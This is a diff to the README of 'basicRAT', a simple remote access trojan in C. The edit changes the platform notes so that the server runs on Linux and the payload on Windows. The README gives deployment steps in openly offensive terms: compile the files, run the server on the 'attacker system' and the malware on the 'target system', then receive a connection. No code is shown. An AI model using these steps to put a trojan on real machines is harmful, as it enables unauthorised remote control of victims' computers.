@@ -1,6 +1,6 @@
 # basicRAT
 - **basicRAT** is a really simple **remote access trojan** written in C and made for **Windows**.
-- Both files are **intened to run on Windows**, they won't work on Linux because they are using windows libraries.
+- malware.c is **intened to run on Windows**, server.c is **intended to run on Linux**
 
 ## Before you compile:
 - **malware.c** is the payload file which has to be executed on the target computer.
@@ -18,7 +18,7 @@
 - Now compile both files using for example GCC.
 
 ## Execution
-- First run the **server.exe** file on the **attacker system**.
+- First run the **server** file on the **attacker system**.
 - Then run the **malware.exe** file on the **target system**.
 - In few seconds you should **receive a connection on the server**.
 
